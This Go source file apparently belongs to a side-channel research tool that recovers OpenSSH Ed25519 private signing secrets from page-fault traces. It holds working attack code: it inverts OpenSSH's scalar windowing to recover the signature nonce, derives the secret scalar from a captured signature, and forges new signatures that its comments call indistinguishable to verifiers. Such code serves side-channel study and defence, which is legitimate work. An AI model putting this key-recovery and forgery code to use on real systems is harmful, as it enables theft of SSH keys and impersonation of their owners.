package main

//Contains helpers for debugging, that can recompute some internal values given the secret key
// as well as functions that can recover the edDSA signing secret given the side channel information
//from the page fault trace

import (
	"crypto"
	"crypto/sha512"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"pfFingerprint/cmd/pfOSSHRecoverEdDSAKey/edwards25519"
	"strconv"

	llEdwards "filippo.io/edwards25519"

	"golang.org/x/crypto/ed25519"

	"golang.org/x/crypto/ssh"
)

//parseOSSHKey parses the open ssh key format into crypto.PrivateKey
func parseOSSHKey(r io.Reader) (crypto.PrivateKey, error) {

	buf, err := ioutil.ReadAll(r)
	rawPriv, err := ssh.ParseRawPrivateKey(buf)
	if err != nil {
		return nil, err
	}
	priv, ok := rawPriv.(crypto.PrivateKey)
	if !ok {
		return nil, fmt.Errorf("failed to convert to crypto.PrivateKey")
	}
	return priv, nil
}

//parseSignature returns (R,s) components of signature or an error
//if sig is malformed
func parseSignature(sig []byte) ([]byte, []byte, error) {
	if len(sig) != ed25519.SignatureSize || sig[63]&224 != 0 {
		return nil, nil, fmt.Errorf("malformed signature")
	}
	return sig[:32], sig[32:], nil
}

//ed25519MessageDigestReduced computes messageDigestReduced as in the edDSA signature
func ed25519MessageDigestReduced(privateKey ed25519.PrivateKey, message []byte) []byte {
	if l := len(privateKey); l != ed25519.PrivateKeySize {
		panic("ed25519: bad private key length: " + strconv.Itoa(l))
	}

	h := sha512.New()
	h.Write(privateKey[:32])

	var digest1, messageDigest [64]byte
	var expandedSecretKey [32]byte
	h.Sum(digest1[:0])
	copy(expandedSecretKey[:], digest1[:])
	expandedSecretKey[0] &= 248
	expandedSecretKey[31] &= 63
	expandedSecretKey[31] |= 64

	h.Reset()
	h.Write(digest1[32:])
	h.Write(message)
	h.Sum(messageDigest[:0])

	var messageDigestReduced [32]byte
	edwards25519.ScReduce(&messageDigestReduced, &messageDigest)

	return messageDigestReduced[:]
}

//sc25519Window3 is a port of the OpenSSH function sc25519_window3. It calculates the value of "b" given
//the output the reduced message digest (ed25519MessageDigestReduced)
func sc25519Window3(reducedMessageDigest []byte) []int8 {
	var carry int8
	r := make([]int8, 85)
	i := 0
	for ; i < 10; i++ {
		r[8*i+0] = int8(reducedMessageDigest[3*i+0] & 7)
		r[8*i+1] = int8((reducedMessageDigest[3*i+0] >> 3) & 7)
		r[8*i+2] = int8((reducedMessageDigest[3*i+0] >> 6) & 7)
		r[8*i+2] ^= int8((reducedMessageDigest[3*i+1] << 2) & 7)
		r[8*i+3] = int8((reducedMessageDigest[3*i+1] >> 1) & 7)
		r[8*i+4] = int8((reducedMessageDigest[3*i+1] >> 4) & 7)
		r[8*i+5] = int8((reducedMessageDigest[3*i+1] >> 7) & 7)
		r[8*i+5] ^= int8((reducedMessageDigest[3*i+2] << 1) & 7)
		r[8*i+6] = int8((reducedMessageDigest[3*i+2] >> 2) & 7)
		r[8*i+7] = int8((reducedMessageDigest[3*i+2] >> 5) & 7)
	}
	r[8*i+0] = int8(reducedMessageDigest[3*i+0] & 7)
	r[8*i+1] = int8((reducedMessageDigest[3*i+0] >> 3) & 7)
	r[8*i+2] = int8((reducedMessageDigest[3*i+0] >> 6) & 7)
	r[8*i+2] ^= int8((reducedMessageDigest[3*i+1] << 2) & 7)
	r[8*i+3] = int8((reducedMessageDigest[3*i+1] >> 1) & 7)
	r[8*i+4] = int8((reducedMessageDigest[3*i+1] >> 4) & 7)

	/* Making it signed */
	carry = 0
	for i = 0; i < 84; i++ {
		r[i] += carry
		r[i+1] += r[i] >> 3
		r[i] &= 7
		carry = r[i] >> 2
		r[i] -= carry << 3
	}
	r[84] += carry

	return r
}

//calcOpenSSHB calculates the "b" array from the OpenSSh code that is used to make the
//swap decisions. This can be used for debugging the key recovery
func calcOpenSSHB(privateKey ed25519.PrivateKey, message []byte) []int8 {
	reducedMsgDig := ed25519MessageDigestReduced(privateKey, message)
	return sc25519Window3(reducedMsgDig)
}

//signedBToUnsigned reverts the "unsigned" to "signed" conversion from OpenSSH sc25519Window3
//If you call unsignedBToMessageDigestReduced on the result you get the "messageDigestReduced"
//value used in the edDSA signature
func signedBToUnsigned(signed []int8) []int8 {
	res := make([]int8, len(signed))
	i := 0
	for ; i < len(signed); i++ {
		if signed[i] < 0 {
			break
		}
		res[i] = signed[i]
	}

	res[i] = signed[i] + 8
	i++

	var add2Next, carry int8
	add2Next = 0
	carry = 1
	for ; i < len(signed); i++ {
		if signed[i] == 0 {
			if add2Next+carry == 0 {
				res[i] = 0
				carry = 0
			} else {
				res[i] = 7
				carry = 1
			}
		} else if signed[i] > 0 {
			res[i] = signed[i] - add2Next - carry
			carry = 0
		} else {
			res[i] = signed[i] - add2Next - carry + 8
			carry = 1
		}
		add2Next = res[i] >> 3
		res[i] &= 7
	}
	return res
}

//unsignedBToMessageDigestReduced reverts the "3 bit split" of sc25519Window3 by
//re-packing unsignedB into one continuous 32 byte array
func unsignedBToMessageDigestReduced(unsignedB []int8) [32]byte {
	res := [32]byte{}
	i := 0
	//commented out lines are the "forward" conversion from  sc25519Window3 that we "invert" here
	for ; i < 10; i++ {
		//	r[8*i+0] = int8(reducedMessageDigest[3*i+0] & 7)
		res[3*i+0] = byte(unsignedB[8*i+0] & 7)
		//r[8*i+1] = int8((reducedMessageDigest[3*i+0] >> 3) & 7)
		res[3*i+0] |= byte((unsignedB[8*i+1] & 7) << 3)
		//r[8*i+2] = int8((reducedMessageDigest[3*i+0] >> 6) & 7)
		res[3*i+0] |= byte((unsignedB[8*i+2] & 7) << 6)
		//r[8*i+2] ^= int8((reducedMessageDigest[3*i+1] << 2) & 7)
		res[3*i+1] |= byte(((unsignedB[8*i+2]) >> 2) & 7)
		//r[8*i+3] = int8((reducedMessageDigest[3*i+1] >> 1) & 7)
		res[3*i+1] |= byte((unsignedB[8*i+3] & 7) << 1)
		//r[8*i+4] = int8((reducedMessageDigest[3*i+1] >> 4) & 7)
		res[3*i+1] |= byte((unsignedB[8*i+4])&7) << 4
		//r[8*i+5] = int8((reducedMessageDigest[3*i+1] >> 7) & 7)
		res[3*i+1] |= byte((unsignedB[8*i+5])&7) << 7
		//r[8*i+5] ^= int8((reducedMessageDigest[3*i+2] << 1) & 7)
		res[3*i+2] |= byte(((unsignedB[8*i+5]) >> 1) & 3)
		//r[8*i+6] = int8((reducedMessageDigest[3*i+2] >> 2) & 7)
		res[3*i+2] |= byte(unsignedB[8*i+6] << 2)
		//r[8*i+7] = int8((reducedMessageDigest[3*i+2] >> 5) & 7)
		res[3*i+2] |= byte(unsignedB[8*i+7] << 5)
	}
	//r[8*i+0] = int8(reducedMessageDigest[3*i+0] & 7)
	res[3*i+0] |= byte(unsignedB[8*i+0]) & 7
	//r[8*i+1] = int8((reducedMessageDigest[3*i+0] >> 3) & 7)
	res[3*i+0] |= (byte(unsignedB[8*i+1]) & 7) << 3
	//r[8*i+2] = int8((reducedMessageDigest[3*i+0] >> 6) & 7)
	res[3*i+0] |= byte((unsignedB[8*i+2] & 7) << 6)
	//r[8*i+2] ^= int8((reducedMessageDigest[3*i+1] << 2) & 7)
	res[3*i+1] |= byte(((unsignedB[8*i+2]) >> 2) & 7)
	//r[8*i+3] = int8((reducedMessageDigest[3*i+1] >> 1) & 7)
	res[3*i+1] |= byte((unsignedB[8*i+3] & 7) << 1)
	//r[8*i+4] = int8((reducedMessageDigest[3*i+1] >> 4) & 7)
	res[3*i+1] |= byte((unsignedB[8*i+4])&7) << 4

	return res
}

//recoverSecretFromSig recovers the secret value "small s" (H_{0..b-1}(privkey)) from a given
//valid signature (from big S more precisely) by using the recovered messageDigestReduced value
func recoverSecretFromSig(message, messageDigestReduced, sigS []byte, publicKey ed25519.PublicKey) []byte {

	//check input length and convert to fixed size arrays
	var messageDigestReduced32, sigS32 [32]byte
	if len(messageDigestReduced) != 32 || len(sigS) != 32 {
		panic("messageDigestReduced or s are not 32 bytge")
	}
	copy(messageDigestReduced32[:], messageDigestReduced)
	copy(sigS32[:], sigS)

	//recompute big R from recovered messageDigestReduced
	var R edwards25519.ExtendedGroupElement
	edwards25519.GeScalarMultBase(&R, &messageDigestReduced32)
	var encodedR [32]byte
	R.ToBytes(&encodedR)

	//compute hram hash value
	var hramDigest [64]byte
	h := sha512.New()
	h.Write(encodedR[:])
	h.Write(publicKey[:])
	h.Write(message)
	h.Sum(hramDigest[:0])
	var hramDigestReduced [32]byte
	edwards25519.ScReduce(&hramDigestReduced, &hramDigest)

	//compute mul inverse of hram in ed25519 scalar space
	hramSC, err := llEdwards.NewScalar().SetCanonicalBytes(hramDigestReduced[:])
	if err != nil {
		panic(err)
	}
	hramInvSC := llEdwards.NewScalar().Invert(hramSC)
	//convert messageDigestReduced to ed25519 scalar
	msgDigRedSC, err := llEdwards.NewScalar().SetCanonicalBytes(messageDigestReduced)
	if err != nil {
		panic(err)
	}
	//convert sigS32 to ed25519 scalar
	tmp, err := llEdwards.NewScalar().SetCanonicalBytes(sigS32[:])
	if err != nil {
		panic(err)
	}

	//compute  (sigS  - messageDigestReduced) * hramDigestReduced^{-1} in the ed25519 scalar space
	//this will give us the secret "small s" ( H_{0..b-1}(privkey) )
	tmp.Subtract(tmp, msgDigRedSC)
	tmp.Multiply(tmp, hramInvSC)
	var secret [32]byte
	copy(secret[:], tmp.Bytes())

	//recompute pubkey for debug purpose
	var recomputedPubKey edwards25519.ExtendedGroupElement
	edwards25519.GeScalarMultBase(&recomputedPubKey, &secret)
	var recomputedPubKeyBytes [32]byte
	recomputedPubKey.ToBytes(&recomputedPubKeyBytes)
	log.Printf("recomputed pubkey : %x", recomputedPubKeyBytes)

	return secret[:]
}

//signWithIntermediateSecret creates a valid edDSA signature using the secret recovered by recoverSecretFromSig
//Someone knowing the secret key, could detect that the ephemeral key was not chosen according to the edDSA
//standard, as we cannot recover the value used for this. However, to verifies not knowing the secret key
//this should be indistinguishable
func signWithIntermediateSecret(message, intermediateSecret []byte, publicKey ed25519.PublicKey) ([]byte, error) {
	if l := len(intermediateSecret); l != 32 {
		return nil, fmt.Errorf("intermediate secret must have 32 byte")
	}
	var expandedSecretKey [32]byte
	copy(expandedSecretKey[:], intermediateSecret)

	h := sha512.New()

	var messageDigest, hramDigest [64]byte

	h.Reset()
	h.Write(publicKey) //in original signature this would be a hash of the private key, that we cannot recover
	h.Write(message)
	h.Sum(messageDigest[:0])

	var messageDigestReduced [32]byte
	edwards25519.ScReduce(&messageDigestReduced, &messageDigest)
	var R edwards25519.ExtendedGroupElement
	edwards25519.GeScalarMultBase(&R, &messageDigestReduced)

	var encodedR [32]byte
	R.ToBytes(&encodedR)

	h.Reset()
	h.Write(encodedR[:])
	h.Write(publicKey)
	h.Write(message)
	h.Sum(hramDigest[:0])
	var hramDigestReduced [32]byte
	edwards25519.ScReduce(&hramDigestReduced, &hramDigest)

	var s [32]byte
	edwards25519.ScMulAdd(&s, &hramDigestReduced, &expandedSecretKey, &messageDigestReduced)

	signature := make([]byte, ed25519.SignatureSize)
	copy(signature[:], encodedR[:])
	copy(signature[32:], s[:])

	return signature, nil
}
